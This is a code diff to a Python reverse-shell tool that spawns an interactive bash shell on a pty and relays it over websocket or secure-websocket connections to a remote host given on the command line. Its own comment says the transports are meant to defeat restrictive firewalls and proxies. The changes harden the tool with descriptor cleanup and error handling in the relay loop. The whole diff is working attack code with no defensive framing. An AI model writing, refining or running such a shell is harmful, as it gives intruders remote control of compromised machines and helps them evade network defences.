@@ -7,11 +7,17 @@
 #
 # But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies
 
-import argparse, base64, functools, hashlib, os, pty, select, ssl, socket, struct, time
+import argparse, base64, errno, functools, hashlib, os, pty, select, ssl, socket, struct, time, traceback
 
 class FileDesc:
     def __init__(self, fd):
         self.fd = fd
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, exctype, excval, traceback):
+        os.close(self.fd)
 
     def fileno(self):
         return self.fd
@@ -286,16 +292,31 @@ if __name__ == '__main__':
         os.execl('/bin/bash', '-i')
     else: # Parent
 
-        childobj = FileDesc(childfd)
-        with locals()[transport](args.host, args.port) as server:
+        with FileDesc(childfd) as childobj, \
+             locals()[transport](args.host, args.port) as server:
 
-            while True:
-                rlist, _, xlist = select.select([childobj, server], [], [childobj, server], 1.0)
-                if xlist != []:
-                    break
+            run = True
+            while run:
+                rlist, _, _ = select.select([childobj, server], [], [], 1.0)
 
                 for r in rlist:
-                    d = r.read()
+                    try:
+                        d = r.read()
+
+                    except OSError as e:
+                        if r == childobj and e.errno == errno.EIO:
+                            # This occurs during a normal pty close
+                            pass
+                        else:
+                            traceback.print_exc()
+                        run = False
+                        break
+                            
+                    except Exception as e:
+                        traceback.print_exc()
+                        run = False
+                        break
+
                     if d:
                         w = server if r == childobj else childobj
                         w.write(d)
